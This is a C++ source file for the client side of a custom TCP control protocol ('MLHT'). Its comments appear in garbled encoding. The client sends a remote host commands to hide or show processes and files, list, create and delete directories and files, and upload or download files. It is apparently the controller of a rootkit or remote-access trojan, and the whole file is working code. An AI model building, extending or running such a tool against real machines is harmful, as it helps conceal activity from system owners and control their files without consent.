#include "MLHT_CLIENT.h"


//��ʼ���ͻ���
MLHT_CLIENT::MLHT_CLIENT(char* ip,int port){

	IDtt = 1;

	p_send = new MLHT();
	p_get = new MLHT();

	WSAStartup(MAKEWORD(2, 2), &wsaData);
	//������������Ӧ�ó����DLL���õĵ�һ��Windows Sockets������
	//������Ӧ�ó����DLLָ��Windows Sockets API�İ汾�ż�����ض�Windows Socketsʵ�ֵ�ϸ�ڡ�
	//Ӧ�ó����DLLֻ����һ�γɹ���WSAStartup()����֮����ܵ��ý�һ����Windows Sockets API����
	
	s = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);			//��ʼ��socket
	sockaddr.sin_family = PF_INET;							//sin_familyָ��Э���壬��socket�����ֻ����PF_INET

	strcpy_s(server_ip,strlen(ip)+1,ip);
	sockaddr.sin_addr.S_un.S_addr = inet_addr(server_ip);	//���ӷ�������IP��ַ
	server_port = port;
	sockaddr.sin_port = htons(server_port);					//���ӷ������Ķ˿�
}

//���ӷ����
bool MLHT_CLIENT::ConnectServer(){

	if(connect(s, (SOCKADDR*)&sockaddr, sizeof(SOCKADDR)) == 0)
		return true;
	else
		return false;

}

bool MLHT_CLIENT::CloseSocket(){
	int iResult = closesocket(s);
    if (iResult == SOCKET_ERROR) {
        wprintf(L"closesocket function failed with error: %ld\n", WSAGetLastError());
        WSACleanup();
        return false;
    }

    WSACleanup();
    return true;
}

//�ȴ����ر��ģ���ⷵ�ر����Ƿ�Ϸ�
int MLHT_CLIENT::WaitReturnPacket(){
		
	ZeroMemory(buffer, sizeof(buffer));

	if(recv(s, buffer, SOCKET_BUFFER_SIZE, NULL) != SOCKET_ERROR){
		if(p_get->PacketAccept(((BYTE*)buffer)))
			return PACKET_ACCEPT_SUCCESS;
		else
			return PACKET_ACCEPT_FAIL;
	}
		
	return SOCKET_ERROR;

}

//�ȴ�ACK���ر���
int MLHT_CLIENT::WaitForAckPacket(){

	int ret = WaitReturnPacket();
	if(ret != PACKET_ACCEPT_SUCCESS)
		return ret;

	if(IsAckPacket())
		return GET_ACK;
	else
		return NOT_GET_ACK;

}

//���޲�������
void MLHT_CLIENT::SendPacket(WORD mtu_type){

	ZeroMemory(buffer, sizeof(buffer));

	p_send = new MLHT(IDtt++,mtu_type);
	p_send->PacketSplice((BYTE*)buffer);
	send(s,buffer,p_send->GetPacketLength()+sizeof(BYTE),NULL);//���ͱ���

}

//������������
void MLHT_CLIENT::SendPacket(WORD mtu_type,WORD slicenum,WORD slicesum,char* content,WORD contentlength){
		
	ZeroMemory(buffer, sizeof(buffer));

	p_send = new MLHT(IDtt++,mtu_type,slicenum,slicesum,(BYTE*)content,contentlength);
	p_send->PacketSplice((BYTE*)buffer);
	send(s,buffer,p_send->GetPacketLength()+sizeof(BYTE),NULL);//���ͱ���

}

//��ACK���ر���
void MLHT_CLIENT::SendACKPacket(){
	SendPacket(MLHT_MTU_TYPE_ACK | p_get->GetPacketType());
}

//��FIN���ر���
void MLHT_CLIENT::SendFINPacket(){
	SendPacket(MLHT_MTU_TYPE_FIN);
}


bool MLHT_CLIENT::IsAckPacket(){
	return p_get->PacketAnalyze_SYNACKFIN() == MLHT_MTU_TYPE_ACK;
}


bool MLHT_CLIENT::IsFinPacket(){
	return p_get->PacketAnalyze_SYNACKFIN() == MLHT_MTU_TYPE_FIN;
}


bool MLHT_CLIENT::IsReturnPacket(){
	return p_get->PacketAnalyze_FILE() == p_send->PacketAnalyze_FILE();
}


//�����ļ���
int MLHT_CLIENT::SendFilePacket(
	WORD mtu_type,			//�ļ�����Э������
	FILE *fp,				//�������ļ���ָ��
	int contentlen			//�ļ�����
	)
{
	int ret;

	//�����ܷ�Ƭ��
	WORD slice_sum = contentlen/MLHT_SLICE_FILE_LENGTH;
	if(contentlen % MLHT_SLICE_FILE_LENGTH)
		slice_sum++;
		
	char p[MLHT_SLICE_FILE_LENGTH]={0};		//�ļ�ָ��
	int packetlen = MLHT_SLICE_FILE_LENGTH;	//��Ƭ����

	//��Ƭ1->n: ��ͻ���/�����������ļ���Ƭ
	for(WORD slice_num = 1;slice_num <= slice_sum;slice_num++){
		
		if(slice_num == slice_sum)									// ����ĩβ��Ƭ����
			packetlen = contentlen % MLHT_SLICE_FILE_LENGTH;

		fseek(fp,MLHT_SLICE_FILE_LENGTH*(slice_num-1),SEEK_SET);	// ˳��λ�ļ�ָ��
		fread(p,packetlen,1,fp);									// ���ļ�ָ�뿪ʼ��

		SendPacket(mtu_type,slice_num,slice_sum,p,packetlen);		// �����ļ�����

		//�ж��Ƿ񷵻�ACK��
		ret = WaitForAckPacket();
		if(ret != GET_ACK)
			return OP_FAIL;
	}

	return OP_SUCCESS;

}


//�����ļ���
int MLHT_CLIENT::GetFilePacket(
	FILE *fp				//����Ŀ���ļ���ָ��
	)
{
	int ret;

	do{
		ret = WaitReturnPacket();
		if(ret != PACKET_ACCEPT_SUCCESS)
			return ret;

		if(IsReturnPacket()){
			if(fwrite(p_get->GetPacketContent(),
				p_get->GetPacketLength()-MLHT_HEADER_LENGTH,
				1,
				fp)!= 1){
					SendFINPacket();
					return FILE_WRITE_FAIL;
			}
			else
				SendACKPacket();
		}
		else if(IsFinPacket()){
			return OP_FAIL;
		}
	}while(!p_get->IsLastPacket());
	
	return OP_SUCCESS;
}
					

//������ʾ
int MLHT_CLIENT::ShowProcess(){
	SendPacket(MLHT_MTU_TYPE_PROCESS_SHOW);

	int ret = WaitReturnPacket();
	if(ret != PACKET_ACCEPT_SUCCESS)
		return ret;

	if(IsAckPacket())
		return OP_SUCCESS;
	else if(IsFinPacket())
		return OP_FAIL;
	else
		return SOMETHINGWRONG;
}

//��������
int MLHT_CLIENT::HideProcess(){
	SendPacket(MLHT_MTU_TYPE_PROCESS_HIDE);	
	
	int ret = WaitReturnPacket();
	if(ret != PACKET_ACCEPT_SUCCESS)
		return ret;

	if(IsAckPacket())
		return OP_SUCCESS;
	else if(IsFinPacket())
		return OP_FAIL;
	else
		return SOMETHINGWRONG;
}

//�ļ���ʾ
int MLHT_CLIENT::ShowFile(){
	SendPacket(MLHT_MTU_TYPE_FILE_SHOW);
		
	int ret = WaitReturnPacket();
	if(ret != PACKET_ACCEPT_SUCCESS)
		return ret;

	if(IsAckPacket())
		return OP_SUCCESS;
	else if(IsFinPacket())
		return OP_FAIL;
	else
		return SOMETHINGWRONG;
}
	
//�ļ�����
int MLHT_CLIENT::HideFile(){
	SendPacket(MLHT_MTU_TYPE_FILE_HIDE);

	int ret = WaitReturnPacket();
	if(ret != PACKET_ACCEPT_SUCCESS)
		return ret;

	if(IsAckPacket())
		return OP_SUCCESS;
	else if(IsFinPacket())
		return OP_FAIL;
	else
		return SOMETHINGWRONG;
}

//Shell����
int MLHT_CLIENT::ShellLs(char* filedir){
	SendPacket(MLHT_MTU_TYPE_SHELL_LS,1,1,filedir,strlen(filedir)+1);

	int ret = WaitReturnPacket();
	if(ret != PACKET_ACCEPT_SUCCESS)
		return ret;

	if(IsReturnPacket())
		return OP_SUCCESS;
	else if(IsFinPacket())
		return OP_FAIL;
	else
		return SOMETHINGWRONG;

}


int MLHT_CLIENT::ShellMkdir(char* filedir){
	SendPacket(MLHT_MTU_TYPE_SHELL_MKDIR,1,1,filedir,strlen(filedir)+1);

	int ret = WaitReturnPacket();
	if(ret != PACKET_ACCEPT_SUCCESS)
		return ret;
	
	if(IsAckPacket())
		return OP_SUCCESS;
	else if(IsFinPacket())
		return OP_FAIL;
	else
		return SOMETHINGWRONG;
}


int MLHT_CLIENT::ShellRmdir(char* filedir){
	SendPacket(MLHT_MTU_TYPE_SHELL_RMDIR,1,1,filedir,strlen(filedir)+1);
	
	int ret = WaitReturnPacket();
	if(ret != PACKET_ACCEPT_SUCCESS)
		return ret;
	
	if(IsAckPacket())
		return OP_SUCCESS;
	else if(IsFinPacket())
		return OP_FAIL;
	else
		return SOMETHINGWRONG;
}


int MLHT_CLIENT::ShellRm(char* filename){
	SendPacket(MLHT_MTU_TYPE_SHELL_RM,1,1,filename,strlen(filename)+1);
	
	int ret = WaitReturnPacket();
	if(ret != PACKET_ACCEPT_SUCCESS)
		return ret;

	if(IsAckPacket())
		return OP_SUCCESS;
	else if(IsFinPacket())
		return OP_FAIL;
	else
		return SOMETHINGWRONG;
}


//�ϴ��ļ�
int MLHT_CLIENT::UpLoadFile(
	char* uploadFilename,	//�ϴ���Դ�ļ�·��
	char* uploadFiledir		//�ϴ���Ŀ���ļ�·��
	)
{
	//�ж��ļ�·���Ƿ�Ϸ�
	FILE *fp = fopen(uploadFilename,"rb");

	if(fp == NULL){
		fclose(fp);
		return FILE_READ_FAIL;
	}
		
	//�����ļ���С�Ƿ����
	fseek(fp,0L,SEEK_END);			// ��λ���ļ�ĩβ
	int contentlen = ftell(fp);		// ����ָ��ƫ���ļ�ͷ��λ��(���ļ����ַ�����)
	if(contentlen > MAX_FILE_SIZE){
		fclose(fp);
		return FILE_TOO_LARGE;
	}

	SendPacket(MLHT_MTU_TYPE_SHELL_UPLOAD,1,1,uploadFiledir,strlen(uploadFiledir)+1);

	//�ж��Ƿ񷵻�ACK��,
	if(WaitForAckPacket() != GET_ACK){
		fclose(fp);
		return OP_FAIL;
	}

	int ret = SendFilePacket(MLHT_MTU_TYPE_SHELL_UPLOAD,fp,contentlen);
	fclose(fp);
	return ret;

}

	
//�����ļ�
int MLHT_CLIENT::DownLoadFile(
	char* downloadFilename,	//�����ļ�·��
	char* downloadFiledir	//�浽�ı���Ŀ¼·��
	)
{
	//��Ȿ��Ŀ¼�Ƿ�Ϸ�
	FILE* fp = fopen(downloadFiledir,"ab");
	if(fp == NULL){
		fclose(fp);
		return FILE_OPEN_FAIL;
	}

	SendPacket(MLHT_MTU_TYPE_SHELL_DOWNLOAD,1,1,downloadFilename,strlen(downloadFilename)+1);
	
	//�ж��Ƿ񷵻�ACK��,
	if(WaitForAckPacket() != GET_ACK){
		fclose(fp);
		return OP_FAIL;
	}

	int ret = GetFilePacket(fp);
	fclose(fp);
	return ret;

}
